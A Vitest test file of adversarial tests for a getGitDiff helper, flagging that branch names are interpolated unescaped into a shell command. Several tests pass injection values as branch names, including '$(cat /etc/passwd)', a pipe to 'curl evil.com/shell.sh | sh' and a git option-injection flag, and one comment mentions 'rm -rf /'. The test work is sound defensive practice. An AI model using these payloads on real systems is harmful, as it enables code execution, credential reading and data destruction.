import { describe, it, expect, vi, beforeEach } from 'vitest';

vi.mock('node:child_process', () => ({
  execSync: vi.fn(),
}));

import { getGitDiff } from '@/lib/git-diff';
import { execSync } from 'node:child_process';

const mockExecSync = vi.mocked(execSync);

beforeEach(() => {
  vi.clearAllMocks();
});

describe('git-diff adversarial tests', () => {
  describe('getGitDiff — command injection', () => {
    it('should be vulnerable to command injection via branch name with semicolons', () => {
      // BUG FOUND (CRITICAL): branch names are interpolated directly into shell command
      // `git diff ${branchA}...${branchB}` — no escaping or validation
      // An attacker could pass: "main; rm -rf /" as a branch name
      mockExecSync.mockReturnValue('some diff');

      getGitDiff('main; echo PWNED', 'dev');

      // Verify the raw unsanitized input was passed to execSync
      const command = mockExecSync.mock.calls[0][0] as string;
      // BUG FOUND: command injection — semicolons in branch name execute arbitrary commands
      expect(command).toContain('; echo PWNED');
    });

    it('should be vulnerable to command injection via backticks in branch name', () => {
      // BUG FOUND (CRITICAL): backtick injection
      mockExecSync.mockReturnValue('diff');

      getGitDiff('`whoami`', 'dev');

      const command = mockExecSync.mock.calls[0][0] as string;
      expect(command).toContain('`whoami`');
    });

    it('should be vulnerable to command injection via $() in branch name', () => {
      // BUG FOUND (CRITICAL): subshell injection
      mockExecSync.mockReturnValue('diff');

      getGitDiff('$(cat /etc/passwd)', 'dev');

      const command = mockExecSync.mock.calls[0][0] as string;
      expect(command).toContain('$(cat /etc/passwd)');
    });

    it('should be vulnerable to command injection via pipe in branch name', () => {
      // BUG FOUND (CRITICAL): pipe injection
      mockExecSync.mockReturnValue('diff');

      getGitDiff('main | cat /etc/passwd', 'dev');

      const command = mockExecSync.mock.calls[0][0] as string;
      expect(command).toContain('| cat /etc/passwd');
    });

    it('should be vulnerable via branchB parameter too', () => {
      mockExecSync.mockReturnValue('diff');

      getGitDiff('main', 'dev; curl evil.com/shell.sh | sh');

      const command = mockExecSync.mock.calls[0][0] as string;
      expect(command).toContain('curl evil.com');
    });
  });

  describe('getGitDiff — output truncation', () => {
    it('should truncate output exceeding maxChars', () => {
      const longDiff = 'a'.repeat(6000);
      mockExecSync.mockReturnValue(longDiff);

      const result = getGitDiff('main', 'dev');
      expect(result.length).toBeLessThan(6000);
      expect(result).toContain('... (truncated)');
    });

    it('should not truncate output exactly at maxChars boundary', () => {
      const exactDiff = 'a'.repeat(5000);
      mockExecSync.mockReturnValue(exactDiff);

      const result = getGitDiff('main', 'dev');
      // length === maxChars, condition is > not >=
      expect(result).not.toContain('truncated');
      expect(result.length).toBe(5000);
    });

    it('should respect custom maxChars parameter', () => {
      const diff = 'a'.repeat(200);
      mockExecSync.mockReturnValue(diff);

      const result = getGitDiff('main', 'dev', 100);
      expect(result).toContain('... (truncated)');
      // The slice is 0..100 + truncation message
      expect(result.startsWith('a'.repeat(100))).toBe(true);
    });

    it('should handle maxChars of 0 — truncates everything', () => {
      // BUG HUNT: maxChars=0 means slice(0,0) = empty string
      mockExecSync.mockReturnValue('some diff content');

      const result = getGitDiff('main', 'dev', 0);
      // diff.length (17) > 0 is true, so it truncates
      // slice(0,0) = '' + '\n\n... (truncated)' = '\n\n... (truncated)'
      expect(result).toContain('... (truncated)');
      expect(result).not.toContain('some diff');
    });

    it('should handle negative maxChars — slice with negative index', () => {
      // BUG HUNT: slice(0, -1) returns everything except last char — NOT truncation!
      // BUG FOUND: negative maxChars not validated — produces unexpected results
      mockExecSync.mockReturnValue('hello world');

      const result = getGitDiff('main', 'dev', -1);
      // 'hello world'.length (11) > -1 is true, so truncation branch executes
      // slice(0, -1) = 'hello worl' (drops last char) + '... (truncated)'
      // This is technically wrong but doesn't crash
      expect(result).toContain('... (truncated)');
    });
  });

  describe('getGitDiff — empty diff handling', () => {
    it('should return "No differences found." for empty string output', () => {
      mockExecSync.mockReturnValue('');

      const result = getGitDiff('main', 'dev');
      expect(result).toBe('No differences found.');
    });

    it('should return diff content for non-empty output', () => {
      mockExecSync.mockReturnValue('diff --git a/file.ts b/file.ts\n+new line');

      const result = getGitDiff('main', 'dev');
      expect(result).toContain('diff --git');
    });
  });

  describe('getGitDiff — error handling', () => {
    it('should return error message when execSync throws', () => {
      mockExecSync.mockImplementation(() => {
        throw new Error('fatal: bad revision');
      });

      const result = getGitDiff('nonexistent', 'dev');
      expect(result).toContain('Failed to get diff');
      expect(result).toContain('bad revision');
    });

    it('should handle non-Error throws gracefully', () => {
      mockExecSync.mockImplementation(() => {
        throw 'string error';
      });

      const result = getGitDiff('main', 'dev');
      expect(result).toContain('Failed to get diff');
      expect(result).toContain('string error');
    });

    it('should handle maxBuffer exceeded error', () => {
      // BUG HUNT: maxBuffer is 1MB — what if diff is larger?
      mockExecSync.mockImplementation(() => {
        const err = new Error('stdout maxBuffer length exceeded');
        (err as unknown as Record<string, unknown>).status = null;
        throw err;
      });

      const result = getGitDiff('main', 'dev');
      expect(result).toContain('Failed to get diff');
      expect(result).toContain('maxBuffer');
    });
  });

  describe('getGitDiff — branch names with special git characters', () => {
    it('should handle branch names with dots', () => {
      mockExecSync.mockReturnValue('diff content');

      const result = getGitDiff('release/1.0.0', 'release/2.0.0');
      expect(result).toBe('diff content');
    });

    it('should handle branch name that looks like a git range (has ...)', () => {
      // BUG HUNT: "main...dev" is already used in the command template
      // What if branch name itself contains "..."?
      mockExecSync.mockReturnValue('diff');

      getGitDiff('feature/a...b', 'dev');

      const command = mockExecSync.mock.calls[0][0] as string;
      // Command becomes: git diff feature/a...b...dev — which is malformed
      // BUG FOUND: branch names containing "..." break the diff range syntax
      expect(command).toContain('feature/a...b...dev');
    });

    it('should handle branch name starting with dash (git option injection)', () => {
      // BUG FOUND (HIGH): branch name "--output=/tmp/pwned" could be interpreted as a git flag
      mockExecSync.mockReturnValue('diff');

      getGitDiff('--output=/tmp/pwned', 'dev');

      const command = mockExecSync.mock.calls[0][0] as string;
      expect(command).toContain('--output=/tmp/pwned');
    });
  });

  describe('getGitDiff — unicode and special content', () => {
    it('should handle diff output with unicode characters', () => {
      mockExecSync.mockReturnValue('diff --git\n+const greeting = "Cześć 🎉";\n');

      const result = getGitDiff('main', 'dev');
      expect(result).toContain('Cześć');
    });

    it('should handle diff output with null bytes', () => {
      mockExecSync.mockReturnValue('binary file \x00 differs');

      const result = getGitDiff('main', 'dev');
      expect(result).toContain('\x00');
    });
  });
});
